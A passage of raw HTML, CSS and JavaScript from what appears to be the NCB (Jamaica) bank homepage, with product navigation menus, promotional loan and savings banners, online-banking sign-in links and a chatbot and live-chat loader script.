</li><li><a href="https://www.jncb.com/Personal/Loans-Financing/Personal-Loans">Personal Loans</a>
</li><li><a href="https://www.jncb.com/Personal/Loans-Financing/Check-for-Loan-offer">Check for Offer</a>
</li><li><a href="https://www.jncb.com/Personal/Loans-Financing/Realtor-Incentive">Realtor Incentive Programme</a>
</li><li><a href="https://www.jncb.com/Personal/Loans-Financing/Incentive-Programme">Mortgage Incentive Programme</a>
</li><li><a href="https://www.jncb.com/Personal/Loans-Financing/Deposit-Rates-1">Lending Rates</a>
</li><li><a href="https://www.jncb.com/Personal/Loans-Financing/Loan-Calculators">Loan Calculator</a>
</li></ul></div>
<div class="nav-column"><h3 class="yellow">Investing</h3>
<ul>
  <li class="first-submenu"><a href="https://www.jncb.com/Personal/Investing/Investment-Products">Investment Products</a>
</li><li><a href="https://www.jncb.com/Personal/Investing/Retirement-Plans">Retirement Plans</a>
</li><li><a href="https://www.jncb.com/Personal/Investing/Education-Investments">Education Investments</a>
</li><li><a href="https://www.jncb.com/Personal/Investing/Advice-Planning">Advice & Planning</a>
</li><li><a href="https://www.jncb.com/Personal/Investing/Research">Research</a>
</li><li><a href="https://www.jncb.com/Personal/Investing/Wealth-Management">Wealth Management</a>
</li></ul></div>
<div class="nav-column"><h3 class="yellow">Insurance</h3>
<ul>
  <li class="first-submenu"><a href="https://www.jncb.com/Personal/Insurance/Insurance-Plans-Overview">Insurance Plans Overview</a>
</li><li><a href="https://www.jncb.com/Personal/Insurance/Insurnce-Forms">Insurance Forms</a>
</li></ul></div></div> </li><li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown" href="https://www.jncb.com/Business">
  <span class="library-ncb-icon-font">
    Business
    <b class="icon-chevron-down"></b>
  </span>
</a><div>
  <div class="container">
    <div class="nav-column"><h3 class="yellow">Credit Cards</h3>
<ul>
  <li class="first-submenu"><a href="https://www.jncb.com/Business/Credit-Cards/Credit-Cards-for-Business">Credit Cards for Business</a>
</li></ul></div>
<div class="nav-column"><h3 class="yellow">Banking</h3>
<ul>
  <li class="first-submenu"><a href="https://www.jncb.com/Business/Banking/Chequing-Account">Chequing Account</a>
</li><li><a href="https://www.jncb.com/Business/Banking/Savings-Plans">Savings Plans</a>
</li><li><a href="https://www.jncb.com/Business/Banking/Value-Plans">Value Plans</a>
</li><li><a href="https://www.jncb.com/Business/Banking/BusinessAccountRequirements">Account Opening Requirements</a>
</li><li><a href="https://www.jncb.com/Business/Banking/Dropbox_Smart_Safe">Business Deposit Processing (Dropbox/Smart Safe)</a>
</li><li><a href="https://www.jncb.com/Business/Banking/Corporate-Banking">Corporate Banking</a>
</li><li><a href="https://www.jncb.com/Business/Banking/Tresasury-Correspondent-Banking">Treasury & Correspondent Banking</a>
</li><li><a href="https://www.jncb.com/Business/Banking/Online-Banking">Online Banking</a>
</li><li><a href="https://www.jncb.com/Business/Banking/Online-Bank-Demos">Online Banking Demos</a>
</li></ul></div>
<div class="nav-column"><h3 class="yellow">Loans & Financing</h3>
<ul>
  <li class="first-submenu"><a href="https://www.jncb.com/Business/Loans-Financing/Mortgage-Calculator">Mortgage Calculator</a>
</li><li><a href="https://www.jncb.com/Business/Loans-Financing/SME-Development-Loan-USAID">SME Development Loan Fund</a>
</li><li><a href="https://www.jncb.com/Business/Loans-Financing/Unsecured_Loans">Unsecured Loans</a>
</li><li><a href="https://www.jncb.com/Business/Loans-Financing/Secured_Loans">Secured Loans</a>
</li><li><a href="https://www.jncb.com/Business/Loans-Financing/Vehicle-Loans-Leases">Auto Loans</a>
</li></ul></div>
<div class="nav-column"><h3 class="yellow">Investing & Insurance</h3>
<ul>
  <li class="first-submenu"><a href="https://www.jncb.com/Business/Investing/Investment-Options">Investment Options</a>
</li><li><a href="https://www.jncb.com/Business/Investing/Investment-Banking">Investment Banking</a>
</li><li><a href="https://www.jncb.com/Business/Investing/Advice-Planning">Advice & Planning</a>
</li><li><a href="https://www.jncb.com/Business/Investing/Research">Research</a>
</li><li><a href="https://www.jncb.com/Business/Investing/Benefits-Insurance-Overview">Benefits & Insurance Overview</a>
</li></ul></div>
<div class="nav-column"><h3 class="yellow">Merchant Services</h3>
<ul>
  <li class="first-submenu"><a href="https://www.jncb.com/Business/Merchant-Services/Merchant_Product_Guide">Merchant Product Guide</a>
</li><li><a href="https://www.jncb.com/Business/Merchant-Services/PointofSale">Point of Sale (POS)</a>
</li><li><a href="https://www.jncb.com/Business/Merchant-Services/eCommerce-1">mPOS</a>
</li><li><a href="https://www.jncb.com/Business/Merchant-Services/eCommerce">eCommerce</a>
</li><li><a href="https://www.jncb.com/Business/Merchant-Services/Paysmart">PaySmart</a>
</li><li><a href="https://www.jncb.com/Business/Merchant-Services/Become-A-Merchant">Become A Merchant</a>
</li><li><a href="https://www.jncb.com/Business/Merchant-Services/Merchant-Security">Merchant Security</a>
</li><li><a href="https://www.jncb.com/Business/Merchant-Services/Merchant-Newslink">Merchant Newslink</a>
</li><li><a href="https://www.jncb.com/Business/Merchant-Services/File-Transfer-Support-EFTP">File Transfer Support (EFTP)</a>
</li></ul></div></div> </li><li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown" href="https://www.jncb.com/About-Us">
  <span class="library-ncb-icon-font">
    About Us
    <b class="icon-chevron-down"></b>
  </span>
</a><div>
  <div class="container">
    <div class="nav-column"><h3 class="yellow">Corporate Social Responsibility</h3>
<img alt="CORPORATE SOCIAL RESPONSIBILITY" src="https://www.jncb.com/JNCB/media/Main-Librarie/img-menu-about.jpg" style="width:206px;" />
<ul>
	<li class="first-submenu"><a href="https://www.jncb.com/About-Us/Corporate-Social-Responsibility">CORPORATE SOCIAL RESPONSIBILITY &gt;</a></li>
</ul>
</div>
<div class="nav-column"><h3 class="yellow">Company Overview</h3>
<ul>
  <li class="first-submenu"><a href="https://www.jncb.com/About-Us/Company-Overview/Who-We-Are">Who We Are</a>
</li><li><a href="https://www.jncb.com/About-Us/Company-Overview/History">History</a>
</li><li><a href="https://www.jncb.com/About-Us/Company-Overview/Management-Team">Management Team</a>
</li><li><a href="https://www.jncb.com/About-Us/Company-Overview/Board-of-Directors">Board Of Directors</a>
</li><li><a href="https://www.jncb.com/About-Us/Company-Overview/Awards">Awards</a>
</li></ul></div>
<div class="nav-column"><h3 class="yellow">NCB Opportunities</h3>
<ul>
  <li class="first-submenu"><a href="https://www.jncb.com/About-Us/NCB-Opportunities/Annual-Learning-Reports">Annual Learning Reports</a>
</li><li><a href="https://www.jncb.com/About-Us/NCB-Opportunities/Careers-Site">Careers Site</a>
</li><li><a href="https://www.jncb.com/About-Us/NCB-Opportunities/Mobile-Learning">Mobile Learning</a>
</li></ul></div>
<div class="nav-column"><h3 class="yellow">News Room</h3>
<ul>
  <li class="first-submenu"><a href="https://www.jncb.com/About-Us/News-Room/Customer-Survey">Customer Service Survey</a>
</li><li><a href="https://www.jncb.com/About-Us/News-Room/News">News</a>
</li><li><a href="https://www.jncb.com/About-Us/News-Room/Brand-Media-Guides">Brand & Media Guides</a>
</li></ul></div>
<div class="nav-column"><h3 class="yellow">Investor Relations</h3>
<ul>
  <li class="first-submenu"><a href="https://www.jncb.com/About-Us/Reports/Information">Information</a>
</li><li><a href="https://www.jncb.com/About-Us/Reports/Annual-Reports">Annual Reports</a>
</li><li><a href="https://www.jncb.com/About-Us/Reports/Quarterly-Reports">Quarterly Reports</a>
</li><li><a href="https://www.jncb.com/About-Us/Reports/Financials">Financials</a>
</li></ul></div></div> </li><li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown" href="https://www.jncb.com/Support">
  <span class="library-ncb-icon-font">
    Support
    <b class="icon-chevron-down"></b>
  </span>
</a><div>
  <div class="container">
    <div class="nav-column"><h3 class="yellow">Security</h3>
<ul>
  <li class="first-submenu"><a href="https://www.jncb.com/Support/Security/Report-Fraud">Report Fraud</a>
</li><li><a href="https://www.jncb.com/Support/Security/RSA">RSA Security Token</a>
</li><li><a href="https://www.jncb.com/Support/Security/Security-Certificate-Test-1">Report Phishing</a>
</li><li><a href="https://www.jncb.com/Support/Security/Security-Guarantee">Security Guarantee</a>
</li><li><a href="https://www.jncb.com/Support/Security/Protecting-Yourself">Protecting Yourself</a>
</li><li><a href="https://www.jncb.com/Support/Security/Security-Certificate-Test">Security Certificate Test</a>
</li></ul></div>
<div class="nav-column"><h3 class="yellow">Customer Service</h3>
<ul>
  <li class="first-submenu"><a href="https://www.jncb.com/Support/Requirements/Existing-Supplier-Login">Existing Supplier Login</a>
</li><li><a href="https://www.jncb.com/Support/Requirements/New-Supplier-Registration">New Supplier Registration</a>
</li><li><a href="https://www.jncb.com/Support/Requirements/Service-Standards">Service Standards</a>
</li><li><a href="https://www.jncb.com/Support/Requirements/Complaint-Management-Standard-Operating-Guidelin">Complaint Management - Standard Operating Guideline</a>
</li><li><a href="https://www.jncb.com/Support/Requirements/Customer-Service-Charter">Customer Service Charter</a>
</li><li><a href="https://www.jncb.com/Support/Requirements/Electronic-Dispute-Form">Electronic Dispute Form</a>
</li><li><a href="https://www.jncb.com/Support/Requirements/SWIFT-Wire-Transfer-Instructions">Wire Transfer Instructions</a>
</li></ul></div>
<div class="nav-column"><h3 class="yellow">Help & Resources</h3>
<ul>
  <li class="first-submenu"><a href="https://www.jncb.com/employerportal">Employer Portal</a>
</li><li><a href="https://www.jncb.com/Support/Help-Resources/Automotive-Dealer-Portal">Automotive Dealer Portal</a>
</li><li><a href="https://www.jncb.com/Support/Help-Resources/Freelancer-Portal">Freelance Portal</a>
</li><li><a href="https://www.jncb.com/Support/Help-Resources/Foreign-Exchange-Services">Foreign Exchange Services</a>
</li><li><a href="https://www.jncb.com/Support/Help-Resources/FAQ">FAQ</a>
</li><li><a href="https://www.jncb.com/Support/Help-Resources/Forms_and_Documents_for_Downloads">Forms and Documents for Downloads</a>
</li><li><a href="https://www.jncb.com/Support/Help-Resources/Fees">Fees</a>
</li><li><a href="https://www.jncb.com/Support/Help-Resources/Reclaimed-Listings">Reclaimed Listings</a>
</li><li><a href="https://www.jncb.com/Support/Help-Resources/How-to-Avoid-Fees">How to Avoid Fees</a>
</li><li><a href="https://www.jncb.com/Support/Help-Resources/Sponsorship">Sponsorship</a>
</li></ul></div>
<div class="nav-column"><h3 class="yellow">Contact</h3>
<ul>
	<li class="first-submenu"><a href="https://www.jncb.com/support/contact/contact-us"><span class="contact-menu-item">Contact Us<br />
	Department Listings</span></a></li>
	<li><a href="https://www.jncb.com/tel:1-888-622-3477"><span class="contact-menu-item">Customer Care<br />
	888-622-3477</span></a></li>
	<li><a href="https://www.jncb.com/tel:929-4622"><span class="contact-menu-item">Branch Services<br />
	876-929-4622</span></a></li>
</ul>
</div>
<div class="nav-column"><h3 class="yellow">Locate</h3>
<div class="google-map-menu"><a href="https://www.jncb.com/Support/Locate/Branches-ABMs"><img class="img-responsive" src="https://www.jncb.com/JNCB/media/Main-Librarie/maps-nav.jpg" /></a></div>

<ul>
	<li class="first-submenu"><a href="https://www.jncb.com/Support/Locate/Branches-ABMs"><span class="library-ncb-icon-font"><i class="icon-location">&nbsp;</i></span><span class="contact-menu-item"><b>Branches &amp; ABMs</b><br />
	Find a Branch Near You</span></a></li>
</ul>
</div></div> </li></ul></div>

      </nav>
    </div>
  </div>
</header>


<!-- Content -->
<div class="mainContent">
  

<div id="home-page">
  <section class="section-hero-slider">
    <div class="overlay-wrapper hidden-mobile">
      <div class="log-in-wrap">
        <div class="hero-singIn">
          <div class="bs-login">
<ul class="nav nav-tabs">
	<li class="active"><a data-toggle="tab" href="https://www.jncb.com/#sectionA">PERSONAL</a></li>
	<li><a data-toggle="tab" href="https://www.jncb.com/#sectionB">BUSINESS</a></li>
</ul>

<div class="tab-content">
<div class="tab-pane fade in active" id="sectionA">
<h3>Online Banking</h3>
<!-- <div class="input-group"><label for="usr">*User ID</label> <input aria-describedby="basic-addon1" class="form-control" type="text" /></div>
		<div class="input-group">
                <label for="usr">*Password</label>
                <input type="text" class="form-control" aria-describedby="basic-addon2">
            </div>

			<form method="post" action="<?php echo basename(__FILE__); ?>">
				<div class="checkbox"><label><input type="checkbox" value="" />Save User ID</label></div>
			</form> --><a class="btn btn-default" href="https://www.jncb.com/internetbanking?rd=RetailLogon" onclick="ga('send','event',{'eventCategory':'Retail Internet Banking','eventAction':'Sign In','eventLabel':'Home Page Link','eventValue': 55});" target="_blank" type="button">SIGN-IN</a>

<div class="input-group enroll-buttom"><!--<a href="https://www.jncb.com/#">Forgot ID/Password?</a>--><a class="btn btn-primary btn-lg" href="https://www.jncb.com/internetbanking?rd=RetailRegister" onclick="ga('send','event',{'eventCategory': 'Retail Internet Banking','eventAction': 'Enrollment','eventLabel':'Home Page Link','eventValue': 55});" target="_blank">Enroll Now</a></div>

<div class="input-group enroll-buttom"><!--<a href="https://www.jncb.com/#">Forgot ID/Password?</a>--><a class="btn btn-primary btn-lg" href="https://www.jncb.com/Personal/Banking/Online-Bank-Demos">Online Banking Demos</a></div>

<hr style="border-top-color: rgb(255, 255, 255); border-top-width: 1px; border-top-style: solid;" />
<div class="input-group enroll-buttom"><button class="btn btn-warning btn-lg accOpBtn" data-target="#accountOpeningModal" data-toggle="modal" type="button">Open / Update An Account</button></div>
</div>

<div class="tab-pane fade" id="sectionB">
<h3>Online Banking</h3>
<!-- <div class="input-group"><label for="usr">*User ID</label> <input aria-describedby="basic-addon1" class="form-control" type="text" /></div>

			<div class="input-group"><label for="usr">*Password</label> <input aria-describedby="basic-addon2" class="form-control" type="text" /></div>

			<form method="post" action="<?php echo basename(__FILE__); ?>">
				<div class="checkbox"><label><input type="checkbox" value="" />Save User ID</label></div>
			</form> --><a class="btn btn-default" href="https://www.jncb.com/internetbanking?rd=CorporateLogin" onclick="ga('send','event',{'eventCategory':'Corporate Internet Banking','eventAction':'Sign In','eventValue': 55});" target="_blank" type="button">SIGN-IN</a>

<div class="input-group enroll-buttom"><!--<a href="https://www.jncb.com/#">Forgot ID/Password?</a>--><a class="btn btn-primary btn-lg" href="https://www.jncb.com/Business/Banking/Online-Banking" target="_blank">Enroll Now</a></div>

<div class="input-group enroll-buttom"><!--<a href="https://www.jncb.com/#">Forgot ID/Password?</a>--><a class="btn btn-primary btn-lg" href="https://www.jncb.com/Business/Banking/Online-Bank-Demos">Online Banking Demos</a></div>
</div>
</div>
</div>

        </div>
      </div>
    </div>
    <style>
  .royalSlider > .rsContent {
    visibility: hidden; 
  }
  @media screen and (min-width:960px) and (min-height:660px) {
    .heroSlider .rsOverflow,
    .royalSlider.heroSlider {
      height: 738px !important;
    }
  }
  
  @media screen and (min-width:960px) and (min-height:1000px) {
    .heroSlider .rsOverflow,
    .royalSlider.heroSlider {
      height: 660px !important;
    }
  }
  @media screen and (min-width: 480px) and (max-width: 960px) {
    .section-hero-slider .hidden-mobile {
      display:none!important;
    }
    .royalSlider.heroSlider,
    .royalSlider.heroSlider .rsOverflow {
      height: 378px !important;
    }
    .infoBlock {
      padding: 10px;
      height: auto;
      max-height: 100%;
      min-width: 40%;
      left: 45px;
      top: 114px;
      right: auto;
      font-size: 12px;
    }
    .infoBlock h3 {
      font-size: 32px;
      line-height: 1em;
      font-weight: 600;
    }
    .infoBlock p {
      font-size: 16px;
      line-height: 1em;
    }
    .infoBlock a {
      font-size: 14px;
      padding: 12px 40px
    }
  }
  @media screen and (min-width: 0px) and (max-width: 479px) {
    .section-hero-slider .hidden-mobile {
      display:none!important;
    }
    .royalSlider.heroSlider,
    .royalSlider.heroSlider .rsOverflow {
      height: 378px !important;
    }
    .infoBlock {
      padding: 10px;
      height: auto;
      max-height: 100%;
      min-width: 80%;
      left: 25px;
      top: 208px;
      right: auto;
      font-size: 12px;
    }
    .infoBlock h3 {
      font-size: 20px;
      line-height: 1em;
      font-weight: 600;
    }
    .infoBlock p {
      font-size: 12px;
      line-height: 1em;
    }
    .infoBlock a {
      font-size: 14px;
      padding: 12px 10px
    }
    .rsMinW .rsArrowRight {
      right: 0px;
    }
    .rsMinW .rsArrowLeft {
      left: 10px;
    }
    .rsMinW .rsBullet span {
      width: 10px;
      height: 10px;
    }
  }
   @media screen and (max-width: 960px) {
      .section-hero-slider .logo {
        display: none;
        }
</style>
<div class="royalSlider heroSlider rsMinW" id="full-width-slider">
<div class="rsContent">
  <img src="https://www.jncb.com/JNCB/media/Main-Librarie/Hero%20Slider%20Images/Mobile-App-Web-Banner.png?ext=.png" alt="" class="rsImg" />
  <div class="slider-content-wrapper">
    <div class="slider-content">
      <div class="infoBlock rsABlock infoBlockLeftBlack" data-fade-effect="" data-move-effect="bottom" data-move-offset="10" data-speed="200">
        <img src="https://www.jncb.com/" alt="" class="logo img-responsive" />
        <h3><span style="color:gold;"><b>Bank On The Go</b> with the <b>NCB Mobile App</b></span></h3>
        <p>Manage your account | Pay your bills | Transfer money</p>
        <a style="background-color:#f37224; border-color:#f37224;" href="https://www.jncb.com/app/" onclick="" >Download Now</a>
      </div>
    </div>
  </div>
</div><div class="rsContent">
  <img src="https://www.jncb.com/JNCB/media/Main-Librarie/Hero%20Slider%20Images/NCB-Max-Deposit-Web-Banner-FLAT-1425x855.jpg?ext=.jpg" alt="" class="rsImg" />
  <div class="slider-content-wrapper">
    <div class="slider-content">
      <div class="infoBlock rsABlock infoBlockLeftBlack" data-fade-effect="" data-move-effect="bottom" data-move-offset="10" data-speed="200">
        <img src="https://www.jncb.com/" alt="" class="logo img-responsive" />
        <h3><b><span style="color:#00539b;">You Deserve More...</span></b></h3>
        <p><span style="color:#00539b;">So <b>MAXimise</b> your savings with an <b>NCB Max Deposit account</b></span></p>
        <a style="background-color:#f37224; border-color:#f37224;" href="https://www.jncb.com/Personal/Banking/Savings-Accounts/Max-Deposit" onclick="" >Open An Account Here</a>
      </div>
    </div>
  </div>
</div><div class="rsContent">
  <img src="https://www.jncb.com/JNCB/media/Main-Librarie/Hero%20Slider%20Images/web_bannerGETEXTRA.jpg?ext=.jpg" alt="" class="rsImg" />
  <div class="slider-content-wrapper">
    <div class="slider-content">
      <div class="infoBlock rsABlock infoBlockLeftBlack" data-fade-effect="" data-move-effect="bottom" data-move-offset="10" data-speed="200">
        <img src="https://www.jncb.com/" alt="" class="logo img-responsive" />
        <h3><span style="color:#FFFFFF;font-weight:bold;font-size:30px">Get $$$ FAST</span></h3>
        <p><span style="color:#FFFFFF">You could have money waiting!</span></p>
        <a style="background-color:#f37224; border-color:#f37224;" href="https://loans.jncb.com/" onclick="" >Check Now</a>
      </div>
    </div>
  </div>
</div><div class="rsContent">
  <img src="https://www.jncb.com/JNCB/media/Main-Librarie/Hero%20Slider%20Images/Man_Phone_Fast_Cash.jpg?ext=.jpg" alt="" class="rsImg" />
  <div class="slider-content-wrapper">
    <div class="slider-content">
      <div class="infoBlock rsABlock infoBlockLeftBlack" data-fade-effect="" data-move-effect="bottom" data-move-offset="10" data-speed="200">
        <img src="https://www.jncb.com/" alt="" class="logo img-responsive" />
        <h3><span style="color:#FFFFF;font-weight:bold">Get up to $300,000 to pay bills, buy groceries etc. No branch visit needed.</span></h3>
        <p><span style="color:#0000FF;"></span></p>
        <a style="background-color:#f37224; border-color:#f37224;" href="https://loans.jncb.com/fastCash?utm_source=FastCashHome&utm_medium=HomeBanner&utm_campaign=JNCB_Banner_FastCash" onclick="" >Learn More!</a>
      </div>
    </div>
  </div>
</div><div class="rsContent">
  <img src="https://www.jncb.com/JNCB/media/Main-Librarie/Hero%20Slider%20Images/NCB-Commercial-Loan.jpg?ext=.jpg" alt="" class="rsImg" />
  <div class="slider-content-wrapper">
    <div class="slider-content">
      <div class="infoBlock rsABlock infoBlockLeftBlack" data-fade-effect="" data-move-effect="bottom" data-move-offset="10" data-speed="200">
        <img src="https://www.jncb.com/" alt="" class="logo img-responsive" />
        <h3><span style="color:#0000FF;font-weight:bold">Drive Your Business Forward with our Commercial Vehicle Loan!</span></h3>
        <p><span style="color:#0000FF;">Rates as low as 8.35%</span></p>
        <a style="background-color:#f37224; border-color:#f37224;" href="https://www.jncb.com/Business/Loans-Financing/Vehicle-Loans-Leases?utm_source=JNCB&utm_medium=banner&utm_campaign=homepage" onclick="" >Learn More!</a>
      </div>
    </div>
  </div>
</div>
</div>

<script id="addJS">
  jQuery(document).ready(function($) {
    $('#full-width-slider').royalSlider({
      arrowsNav: true,
      loop: true,
      keyboardNavEnabled: true,
      slidesSpacing: 0,
      controlsInside: false,
      randomizeSlides: true,
      imageScaleMode: 'fill',
      autoScaleSlider: true,
      controlNavigation: 'bullets',
      thumbsFitInViewport: true,
      navigateByClick: false,
      startSlideId: 0,
      autoPlay: {
        // autoplay options go gere
        enabled: false,
        pauseOnHover: true,
        stopAtAction: false,
        delay: 5000
      },
      transitionType:'move',
      globalCaption: false,
      deeplinking: {
        enabled: true,
        change: false
      },
      
    });
  }); 
</script>


<style>
  
.owl-carousel {
	position: relative;
	height: 100%;
	div:not(.owl-controls) {
		height: 100%;
	}
</style>







  </section>
  <section class="section-1">
    <div class="container">
  <div class="row">
    <script type="text/javascript">

function hideCustomBotButtonsNcb() {
	document.getElementById("custom_bot_buttons_container").style.display = "none";
	if(document.getElementById("chat_bot_msg_open")) {
		document.getElementById("chat_bot_msg_open").style.display = "none";
	}
}

function closeLiveChat(){
document.querySelector('ncb-live-chat').style.display='none';
}


function openLiveChat() {
hideCustomBotButtonsNcb();
document.querySelector('ncb-live-chat').style.display = 'flex';
}

customElements.whenDefined('ncb-live-chat').then(function(){
document.querySelector('ncb-live-chat').addEventListener('ncb-live-chat-close',closeLiveChat);});
let scriptElem = document.createElement("SCRIPT");
        let dateElem = new Date();
        scriptElem.type = 'text/javascript';
        scriptElem.setAttribute('id','chatbotscript');
        scriptElem.setAttribute('startbotid','48');
        scriptElem.setAttribute('botisactive','false');
        scriptElem.setAttribute('mobileavatar','60');
        scriptElem.setAttribute('desktopavatar','100');
        scriptElem.setAttribute('flowname','web-loan-flow');
        scriptElem.setAttribute('reserved','x');
        scriptElem.setAttribute('welcomemsg','Hello, I\'m Simone. How may I help you today? </br> Click Here');
        scriptElem.setAttribute('clientid','https://jncb.fluidaibot.com');
        scriptElem.src = `https://jncb.fluidaibot.com/js/integration/fluidaibot_integrations.js?t=${dateElem.getTime()}`;
        scriptElem.setAttribute('custom_bot', 'true');
        scriptElem.setAttribute('product_button_text', 'Need a Loan? </br></br> Click Here');
        scriptElem.setAttribute('service_button_text', 'Need Customer Care Assistance? </br></br> Click Here');
        scriptElem.setAttribute('product_button_onclick', 'loadchat');
        scriptElem.setAttribute('service_button_onclick', 'openLiveChat');
        scriptElem.setAttribute('custom_bot_script_file', 'https://livechat.jncb.com/ncb-live-chat.js');
        document.getElementsByTagName('head')[0].appendChild(scriptElem);


</script>
<style type="text/css">#ncb-live-chat-button{
    position: fixed;
    bottom: 10px;
    right: 50px;
    cursor: pointer;
z-index:3000;
}


ncb-live-chat {
display:none;
    position: fixed;
    bottom: 15rem;
    right: 2rem;
    cursor: pointer;
 width: 20%;
min-width:23em;
z-index:3000;
height:70%;
}

ncb-live-chat {
    overflow-y: auto;
}

ncb-live-chats:before {
  border: 12.5px solid transparent;
  border-top: 12.5px solid #8CA8D8;
  border-bottom: 0;
  height: 0;
  width: 0;
  border-top-width: 25px;
  content: "";
  display: block;
  position: absolute;
  left: 3rem;
  bottom: -25px;
  transform-origin: center;
  transform: rotate(90deg) skew(-25deg) translateY(16.6666666667px);
}

}
</style>
<ncb-live-chat></ncb-live-chat><div class="col-md-9">
<h2>How Can We Help You?



</h2>
</div><div role="tabpanel">
<ul class="nav nav-tabs tabs-home" role="tablist">
	<li class="active" role="presentation"><a aria-controls="personalHome" data-toggle="tab" href="https://www.jncb.com/#personalHome" role="tab">PERSONAL</a></li>
  




<li role="presentation"><a aria-controls="businessHome" data-toggle="tab" href="https://www.jncb.com/#businessHome" role="tab">BUSINESS</a></li>
</ul><div class="modal" id="accountOpeningModal">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-body">
<div class="row">
<div class="container-fluid">
<div class="card">
<div class="col-md-4">
<div class="card mb">
<div class="card-body mb">
<h5 class="card-title">New NCB Customer?</h5>

<p class="card-text" style="height: 150px;">Jamaican Residents and Non-Residents opening a new deposit, loan, credit card or investment account?</p>
<a class="btn btn-primary mb" href="https://www.jncb.com/openaccountonline" target="_blank" type="button">Open Now</a></div>
</div>
</div>

<div class="col-md-4">
<div class="card mb">
<div class="card-body mb">
<h5 class="card-title">Already an NCB Customer?</h5>

<p class="card-text" style="height: 150px;">Open your new account by selecting &quot;New Account&quot; under Quick Links in Online Banking.<br />
Don&rsquo;t Have Online Banking? <a href="https://retail.ncbelink.com/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&amp;__START_TRAN_FLAG__=Y&amp;__EVENT_ID__=LOAD&amp;ACTION.LOAD=Y&amp;__CALL_MODE__=52&amp;AuthenticationFG.LOGIN_FLAG=1&amp;BANK_ID=077&amp;USER_PRINCIPAL=&amp;REMEMBER_USER_ID=">Register Now</a></p>
<a class="btn btn-primary mb" href="https://www.jncb.com/internetbanking?rd=RetailLogon" target="_blank" type="button">Open In Online Banking</a></div>
</div>
</div>

<div class="col-md-4">
<div class="card mb">
<div class="card-body mb">
<h5 class="card-title">Updating Your Contact Details?</h5>

<p class="card-text" style="height: 150px;">Have any of your details changed? Update your account details here.</p>
<a class="btn btn-primary mb" href="https://remoteonboarding.jncb.com" target="_blank" type="button">Update Now</a></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<p class="ncb-offer"><a class="float" href="https://loans.jncb.com/checkForOffer">Check For Offer</a></p>
<div class="tab-content">
<div role="tabpanel"id="personalHome" class="tab-pane fade in active">
  <div id="owl1" class="owl-carousel owl-theme">
  
<div class="item">
  <div class="plans-box ">
    <div class="plans-img arrow_box_right"><a href="https://loans.jncb.com/checkForOffer?utm_source=jncb&utm_medium=small%20banner"><img class='img-responsive owl-lazy' data-src='https://www.jncb.com/JNCB/media/Main-Librarie/Products/payadvance.jpg?ext=.jpg' /></a></div>
    <div class="tringle-right"></div>
    <div class="wrap-plans-text">     
      <a href="https://loans.jncb.com/checkForOffer?utm_source=jncb&utm_medium=small%20banner"><h4 class="plans-type-pv">Get Extra Money In Minutes!</h4></a>
      <p class="plans-description-pv"><span class="library-ncb-icon-font"><i class="icon-checkmark"></i></span>Borrow up to 100K with Pay Advance Plus. It’s interest free-just a flat fee, no branch visits required and you get the money in your account in jus...</p>
      <a href="https://loans.jncb.com/checkForOffer?utm_source=jncb&utm_medium=small%20banner" class="btn btn-primary btn-lg" type="button">VIEW MORE</a>
    </div>
  </div>
</div><div class="item">
  <div class="plans-box ">
    <div class="plans-img arrow_box_right"><a href="https://www.jncb.com/Personal/Loans-Financing/Mortgage"><img class='img-responsive owl-lazy' data-src='https://www.jncb.com/JNCB/media/Main-Librarie/Products/buy-a-home.jpg?ext=.jpg' /></a></div>
    <div class="tringle-right"></div>
    <div class="wrap-plans-text">     
      <a href="https://www.jncb.com/Personal/Loans-Financing/Mortgage"><h4 class="plans-type-pv">Buy a Home</h4></a>
      <p class="plans-description-pv"><span class="library-ncb-icon-font"><i class="icon-checkmark"></i></span>Buying a home is one of the most important decisions you will ever make. We&#39;ll help you on your way to opening that door.</p>
      <a href="https://www.jncb.com/Personal/Loans-Financing/Mortgage" class="btn btn-primary btn-lg" type="button">VIEW MORE</a>
    </div>
  </div>
</div><div class="item">
  <div class="plans-box ">
    <div class="plans-img arrow_box_right"><a href="https://www.jncb.com/Personal/Cards/Credit-cards"><img class='img-responsive owl-lazy' data-src='https://www.jncb.com/JNCB/media/Main-Librarie/Products/choose-credit-cards.jpg?ext=.jpg' /></a></div>
    <div class="tringle-right"></div>
    <div class="wrap-plans-text">     
      <a href="https://www.jncb.com/Personal/Cards/Credit-cards"><h4 class="plans-type-pv">Choose a Credit Card</h4></a>
      <p class="plans-description-pv"><span class="library-ncb-icon-font"><i class="icon-checkmark"></i></span>Shop, Travel or do the things you enjoy  with the convenience and security of an  NCB credit card. </p>
      <a href="https://www.jncb.com/Personal/Cards/Credit-cards" class="btn btn-primary btn-lg" type="button">VIEW MORE</a>
    </div>
  </div>
</div><div class="item">
  <div class="plans-box ">
    <div class="plans-img arrow_box_right"><a href="https://www.jncb.com/Personal/Banking/Online-Banking"><img class='img-responsive owl-lazy' data-src='https://www.jncb.com/JNCB/media/Main-Librarie/Products/pay_yours_bills.jpg?ext=.jpg' /></a></div>
    <div class="tringle-right"></div>
    <div class="wrap-plans-text">     
      <a href="https://www.jncb.com/Personal/Banking/Online-Banking"><h4 class="plans-type-pv">Pay your Bills Online</h4></a>
      <p class="plans-description-pv"><span class="library-ncb-icon-font"><i class="icon-checkmark"></i></span>Pay your credit card bills, utility bills, NHT mortgage and more at your convenience, anywhere at any time</p>
      <a href="https://www.jncb.com/Personal/Banking/Online-Banking" class="btn btn-primary btn-lg" type="button">VIEW MORE</a>
    </div>
  </div>
</div><div class="item">
  <div class="plans-box ">
    <div class="plans-img arrow_box_right"><a href="https://www.jncb.com/Personal/Investing/Education-Investments/OMNI-Educator"><img class='img-responsive owl-lazy' data-src='https://www.jncb.com/JNCB/media/Main-Librarie/Products/college.jpg?ext=.jpg' /></a></div>
    <div class="tringle-right"></div>
    <div class="wrap-plans-text">     
      <a href="https://www.jncb.com/Personal/Investing/Education-Investments/OMNI-Educator"><h4 class="plans-type-pv">Save for your Child's College Education</h4></a>
      <p class="plans-description-pv"><span class="library-ncb-icon-font"><i class="icon-checkmark"></i></span>Start building your child&#39;s college education  fund and we will reward you with tax-free interest and 35% grant.</p>
      <a href="https://www.jncb.com/Personal/Investing/Education-Investments/OMNI-Educator" class="btn btn-primary btn-lg" type="button">VIEW MORE</a>
    </div>
  </div>
</div><div class="item">
  <div class="plans-box ">
